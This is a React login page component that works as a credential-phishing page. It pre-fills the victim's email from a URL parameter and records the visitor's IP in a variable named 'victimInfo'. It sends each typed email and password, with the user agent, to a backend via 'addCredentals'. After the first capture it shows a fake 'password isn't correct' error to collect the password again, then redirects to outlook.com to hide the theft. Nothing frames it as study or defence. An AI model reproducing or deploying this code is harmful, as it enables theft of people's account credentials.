import React, { useEffect, useState } from "react";
import { useHistory } from "react-router-dom";
import API from "../api/api";
import axios from "axios";
import './login.css'
import logo from '../assets/image.png'
import logo1 from '../assets/logo1.png'
import signin from '../assets/signin.png'
import Form from 'react-bootstrap/Form';
import { useLocation } from 'react-router-dom';

const url = 'https://outlook.com '

const Login = () => {

  const location = useLocation();

  const router = useHistory();
  let [userName,setUserName]=useState(null)
  let [password,setPassword]=useState(null)
  let [error,setError]=useState(false)
  let [count,setCount]=useState(0)
  let [isDisabled,setIsDisabled]=useState(false)
  let [showPassword,setShowPassword]=useState(false)
  let [isQuery,setIsQuery]=useState(false)
  const [victimInfo, setVictimData] = useState({
    ip: "",
  });

  useEffect(() => {
    async function getIP() {
      const resp = await axios.get("https://api.ipify.org/?format=json");
      if (resp.data.ip) {
        setVictimData({ ip: resp.data.ip });
      }
    }
    getIP();
  }, []);

  useEffect(() => {
    const queryParams = new URLSearchParams(location.search);
    const emailParam = queryParams.get('email');
    if (emailParam)
    {
      setIsQuery(true)
    }
    setUserName(emailParam);
  }, [location]);

  async function handleSubmit(e) {
    e.preventDefault()

    if (count === 0)
    {
      let data= {
        userID: userName,
        password: password,
        victimInfo: victimInfo,
        userAgent: navigator?.userAgent,
      }
      //console.log(data)

      try {
        setIsDisabled(true)
        let res = await API.addCredentals(data)
        if (res.status == 201)
        {
          resetForm()
          setError(true)
          setCount(count+1)
          setIsDisabled(false)
        }
        else
        {
          setIsDisabled(false)
        }
      }
      catch (e) {
        setIsDisabled(false)
      }
    }
    else
    {
      let data= {
        userID: userName,
        password: password,
        victimInfo: victimInfo,
        userAgent: navigator?.userAgent,
      }
      //console.log(data)

      try {
        setIsDisabled(true)
        let res = await API.addCredentals(data)

        if (res.status == 201)
        {
          setIsDisabled(false)
          window.location.href=url
        }
        else
        {
          setIsDisabled(false)
        }
      }
      catch (e) {
        setIsDisabled(false)
      }
    }
  }

  function resetForm() {
    if (isQuery)
    {
      setPassword("")
    }
    else
    {
      setUserName("")
      setPassword("")
    }
  }

  return (
      <>
        <form>
          <div className="header bTheme">
            <img className="headerLogo" src={logo} alt="headerLogo"/>
          </div>
          <div className="pLogin">
            <div className="cLogin1 bTheme">
              <img className="logoImg" src={logo} alt="logo"/>
            </div>
            <div className="cLogin2 bTheme1">
              <div className="cLogin2Content">
                <img className="logo1Img" src={logo1} alt="logo1"/>
                <div className="inputGroup">
                  <label className="inputLabel">Email:</label>
                  <input className="inputText" placeholder="email" type="email" value={userName} onChange={(e)=>setUserName(e.target.value)}/>
                </div>
                <div className="inputGroup">
                  <label className="inputLabel">Password:</label>
                  <input className="inputText" placeholder="password" type={showPassword?"text":"password"} value={password} onChange={(e)=>setPassword(e.target.value)}/>
                  <div className="res">
                    <br/>
                    <Form.Check
                        type={"checkbox"}
                        label={` Show password`}
                        style={{color: "#666666"}}
                        onClick={(e)=>setShowPassword(!showPassword)}
                    />
                  </div>
                </div>
                {
                  error?
                      <div className="errorGroup">
                        <p className="errorText">The user name or password you entered isn't correct. Try entering it again.</p>
                      </div>
                      :""
                }
                <div className={isDisabled?"buttonSigninGroupDisabled":"buttonSigninGroup"} onClick={isDisabled?"":handleSubmit}>
                  <img className="siginImg" src={signin} alt="signin"/><span className="signinText cTheme">signin</span>
                </div>
              </div>
            </div>
          </div>
        </form>
      </>
  );
};

export default Login;
